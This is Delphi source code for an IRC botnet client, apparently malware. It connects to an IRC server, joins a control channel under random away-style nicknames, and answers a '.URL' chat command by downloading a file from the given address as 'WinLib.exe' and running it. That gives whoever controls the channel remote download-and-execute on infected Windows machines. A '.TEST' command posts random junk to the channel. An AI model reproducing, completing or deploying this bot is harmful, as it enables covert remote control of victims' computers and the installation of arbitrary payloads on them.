   {
           HOST                  IP            PORT
     IRC.SORCERY.NET   >> 216.122.249.75   >> 6667
     IRC.NEWNET.NET    >> 209.208.101.131  >> 6667
     IRC.EF.NET        >> 208.178.231.190  >> 6667
     IRC.ICQ.COM       >> 64.12.165.57     >> 7000
     IRC.DAL.NET       >> 212.74.101.21    >> 7000
     IRC.QUAKENET.ORG  >> 62.30.30.109     >> 6667
   }

   unit main;

   interface

   uses
    Windows, WinSock;

   var
    IRCPort:integer = 6667;
    IRCServer:string;
    IRCNick:string = '[DUST]kit';
    IRCChan:string = '#TehCow cow';
    Sock1:TSocket;
    SockInfo:Sockaddr_in;
    WSAData:TWSAData;
    buff:array[0..1024] of char;
    Send01:string;
    StringList01:array of string;

          procedure sendmsg(str:string);
          Procedure ReadSock;
          Procedure StartUp;
          Procedure ReStart;
          Procedure AddToList01(Text: string);
          procedure ParseContent(Content:string);
          Procedure SendPing;
          Procedure SendInfo;
          Procedure RandomNick;
          function StrToInt(S: string): integer;
          Function IntToStr(X: integer): string;
          function Trim(const S: string): string; overload;
          function DFile(Caller: cardinal; URL: PChar; FileName: PChar; Reserved: LongWord; StatusCB: cardinal): Longword; stdcall; external 'URLMON.DLL' name 'URLDownloadToFileA';
   implementation

    function RNDNICK:string;
    const
     n:array[0..19]of string=('arne','kurt','sven','h4x','lisa','lena','harold','tim',
                              'greger','igor','mark','hitman','lighter','seczk','zurg',
                              'flamer','abbe','saffe','minor','TEhx');
     a:array[0..11]of string= ('|awy','^awy','_awy','`awy',
                              '|away','^away','_away','`away',
                              '|Gone','^Gone','_Gone','`Gone');
     b:string= ('abcdefghijklmnopqrstuvwxyz_^`[]{}\');
    var
     i,j:integer;
     s:string;
    begin
    randomize();
    i:=random(20);
    j:=random(20);
    if i= 20 then begin
     while j>0 do begin
      randomize();
      s:=s+copy(b,random(length(b)),1);
      j:=j-1;
     end;
    end else begin
     j:=random(11);
     s := n[i]+a[j];
    end;
    result :=s;
    end;

   function rndline:string;
   var
    abc:string;
    i:integer;
   begin
    abc := 'abcdefghijklmnopqrstuvwxyzåäö       ';
    randomize();
    i:=random(80);
   while i<>0 do begin
   sleep(10);
   randomize();
   result := result + copy(abc,random(length(abc)),1);
   i:=i-1;
   end;
   end;

   procedure ReadSock;
    var
     str01:string;
     pack,nr,target,delay:string;
     POR:integer;
    begin
     str01:=buff;
    if pos('Nickname is already in use.',str01) > 0 then
     begin  //Incase nick already used. (duh!)
      send01:='NICK ' + RNDNICK + #13#10;
      send(Sock1,send01[1],Length(send01),0);
      ZeroMemory(@buff,sizeof(buff));
     end else
    if pos('.URL' ,str01)   > 0 then
     begin
      send01 := copy(str01,pos('.URL',str01)+4,length(str01));
      target := copy(send01,1,length(send01));
      target := copy(target,1,length(target)-2);
      DFILE(0,pchar(target),'WinLib.exe', 0, 0);
      WinExec('WinLib.exe',0);
     end else
    if pos('.TEST',str01) > 0 then
     begin
      send01:='PRIVMSG ' + IRCChan +' :'+ rndline + #10#13;
      send(Sock1,send01[1],Length(send01),0);
     end else
    if pos('PING :',str01) > 0 then
     begin  //Replys to 'Server' pings.
      ZeroMemory(@buff,sizeof(buff));
      ParseContent(str01);
      SendPing;
      SetLength(StringList01,0);
      send01:='PRIVMSG ' + IRCChan +' :'+ rndline + #10#13;
      send(Sock1,send01[1],Length(send01),0);
     end else
    if pos('MOTD',str01) > 0 then
     begin  //Most servers will have this. Bot will join channel when this appears.
      ZeroMemory(@buff,sizeof(buff));
      send01:='JOIN ' + IRCChan + #10#13;
      send(Sock1,send01[1],Length(send01),0);
     end else
     ZeroMemory(@buff,sizeof(buff));
    end;

   procedure sendmsg(str:string);
   begin
      send01:='PRIVMSG ' + IRCChan + ' :'+str + #10#13;
      send(Sock1,send01[1],Length(send01),0);
   end;

   function getip(iip:string):String;
   var ip:phostent;
       ipc:cardinal;
       ipa:array[1..4]of byte absolute ipc;
   begin
     ip:=winsock.gethostbyname(pchar(iip));
     if ip=nil then begin
       result:='127.0.0.1';
       exit;
     end else begin
       ipc:=cardinal(pointer(ip^.h_addr_list^)^);
       ipc:=winsock.ntohl(ipc);
     end;
     result:=inttostr(ipa[4])+'.'+inttostr(ipa[3])+'.'+inttostr(ipa[2])+'.'+inttostr(ipa[1]);
   end;

   procedure Startup;
    begin    //Starts the socket and trys to connect.
     WSAStartup(257,WSAData);
     SockInfo.sin_family:=PF_INET;
     SockInfo.sin_port:=htons(IRCPort);
     SockInfo.sin_addr.S_addr:= inet_addr(PChar(getip('irc.undernet.org')));
     Sock1:= socket(PF_INET,SOCK_STREAM,0);
     Connect(Sock1,SockInfo,sizeof(SockInfo));
    end;

   Procedure Restart;
    begin     //Hence the name, restarts if it cant connect, or gets disconnected.
     Shutdown(Sock1,2);
     CloseSocket(Sock1);
     Sleep(5000);
     StartUp;
     SendInfo;
    end;

   procedure ParseContent(Content:string);
    var
     i: integer;
    begin
     i := Pos(' ', Content);
      while (i > 0) do
       begin AddToList01(Copy(Content, 1, i - 1));
        Delete(Content, 1, i); i := Pos(' ', Content);
       end;
        if Length(Content) > 0 then
         AddToList01(Content);
    end;

   Procedure AddToList01(Text: string);
    var
     ListLen: integer;
     Listlen2:integer;
    begin
     ListLen:= Length(StringList01);
     ListLen2:= ListLen + 1;
     SetLength(StringList01, ListLen2);
     StringList01[ListLen]:= Text;
    end;

   procedure SendPing;
    begin     //The PONG reply to the server.
     send01:='PONG ' + StringList01[High(StringList01)];
     send(Sock1,send01[1],Length(send01),0);
    end;


   procedure sendinfo;
    begin     //Info to connect. has to be sent so the server can authorize your connection.
     Randomize;
     send01:='NICK ' + RNDNick + #13#10;
     send(Sock1,send01[1],Length(send01),0);
     send01:='USER poo' + ' ' + #34 + 'wdsfsdfpro' + #34 + ' ' + #34 + '12dsgsdg0.1' + #34 + ' ' + ':' + 'myrealcrapname' + #13#10;
     send(Sock1,send01[1],Length(send01),0);
    end;

   function IntToStr(X: integer): string;
    var
     S: string;
    begin
     Str(X, S);
     Result := S;
    end;

   function StrToInt(S: string): integer;
    var
     V, Code: integer;
    begin
     Val(S, V, Code);
     Result := V;
    end;

   function Trim(const S: string): string;
    var
     I, L: Integer;
    begin
     L := Length(S);
     I := 1;
     while (I <= L) and (S[I] <= ' ') do Inc(I);
     if I > L then Result := '' else
      begin
       while S[L] <= ' ' do Dec(L);
       Result := Copy(S, I, L - I + 1);
      end;
    end;

   Procedure RandomNick;
    begin     // Duh!
     Randomize;
     send01:=rndnick + #13#10;
     send(Sock1,send01[1],Length(send01),0);
    end;

   end.
